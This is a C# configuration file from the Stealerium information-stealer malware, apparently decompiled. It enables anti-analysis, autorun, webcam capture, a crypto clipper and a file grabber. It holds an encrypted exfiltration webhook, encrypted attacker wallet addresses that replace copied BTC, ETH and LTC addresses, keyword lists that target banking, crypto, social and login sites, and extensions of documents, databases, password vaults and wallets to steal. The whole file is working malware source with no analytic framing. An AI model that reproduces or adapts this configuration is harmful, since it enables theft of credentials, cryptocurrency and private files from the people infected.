using System.Collections.Generic;
using Stealerium.Modules.Implant;

namespace Stealerium;

public static class Config
{
	public static string Version = "1.0";

	public static string DebugMode = "0";

	public static string Mutex = "7TRM3V0Q8OJRDE9P9JO7";

	public static string AntiAnalysis = "1";

	public static string Autorun = "1";

	public static string StartDelay = "0";

	public static string WebcamScreenshot = "1";

	public static string KeyloggerModule = "0";

	public static string ClipperModule = "1";

	public static string GrabberModule = "1";

	public static string Webhook = "ENCRYPTED:mV3+XlRDNhukmcN2Ks5cpl2O2YCXp1nnmhUrMMqnajXjgo2ovRI4spJrcud93WHTAjbAC6v9kXQzRe85GONT1fVTbizEFyjbBVtRweIXHvTSX+/ka4SrMPMVgwazKpM2Ih8aewEk0wqTgZ93gA3mUZ4WtyA4L/SlB4opfRy5OkI=";

	public static string Avatar = StringsCrypt.Decrypt(new byte[112]
	{
		227, 229, 163, 37, 29, 43, 37, 158, 104, 37,
		13, 195, 211, 80, 55, 1, 163, 216, 210, 234,
		239, 30, 166, 60, 215, 48, 124, 51, 90, 119,
		2, 1, 202, 159, 135, 229, 169, 49, 13, 133,
		163, 98, 230, 144, 228, 54, 208, 68, 4, 42,
		27, 177, 180, 234, 89, 174, 196, 27, 63, 146,
		137, 167, 104, 90, 106, 136, 189, 147, 138, 11,
		116, 24, 249, 78, 137, 135, 50, 104, 59, 199,
		236, 28, 11, 19, 229, 93, 228, 74, 139, 119,
		81, 64, 135, 108, 108, 143, 177, 159, 239, 235,
		222, 167, 78, 173, 235, 180, 152, 187, 16, 86,
		88, 222
	});

	public static string Username = StringsCrypt.Decrypt(new byte[16]
	{
		208, 138, 80, 115, 89, 12, 47, 194, 189, 116,
		154, 25, 46, 155, 252, 130
	});

	public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
	{
		{ "btc", "ENCRYPTED:HwpkktvWB8gC5xUpK9xyO5RwGgeikuCTFazqvmNkNBS6tfLRu7JWoZhOnbfOPoPR" },
		{ "eth", "ENCRYPTED:h5nPzo5VVcIUntdvuMgyxOfckzb6N4Clt9prfFMXGkDhlostA5xbekKvIrtQPDyE" },
		{ "ltc", "ENCRYPTED:akHr84662QZ2LMTtZ7IUloBPB3AvwmKxIviBDDmpRAvyCdrQP77hkNAx3N91VLZg" }
	};

	public static string[] KeyloggerServices = new string[23]
	{
		"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
		"outlook", "password", "encryption", "account", "login", "key", "sign in", "bank", "credit", "card",
		"shop", "buy", "sell"
	};

	public static string[] BankingServices = new string[7] { "qiwi", "money", "exchange", "bank", "credit", "card", "paypal" };

	public static string[] CryptoServices = new string[24]
	{
		"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
		"xrp", "ltc", "bch", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency", "crypto", "trade",
		"trading", "wallet", "coinomi", "coinbase"
	};

	public static string[] PornServices = new string[4] { "porn", "sex", "hentai", "chaturbate" };

	public static string[] SocialServices = new string[15]
	{
		"facebook", "vk.com", "ok.ru", "instagram", "whatsapp", "twitter", "gmail", "linkedin", "viber", "skype",
		"reddit", "flickr", "youtube", "pinterest", "tiktok"
	};

	public static int GrabberSizeLimit = 5120;

	public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
	{
		["Document"] = new string[11]
		{
			"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
			"json"
		},
		["DataBase"] = new string[13]
		{
			"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
			"dbf", "wallet", "ini"
		},
		["SourceCode"] = new string[19]
		{
			"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
			"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
		},
		["Image"] = new string[7] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
	};

	public static void Init()
	{
		Webhook = StringsCrypt.DecryptConfig(Webhook);
		if (!(ClipperModule != "1"))
		{
			ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
			ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
			ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
		}
	}
}
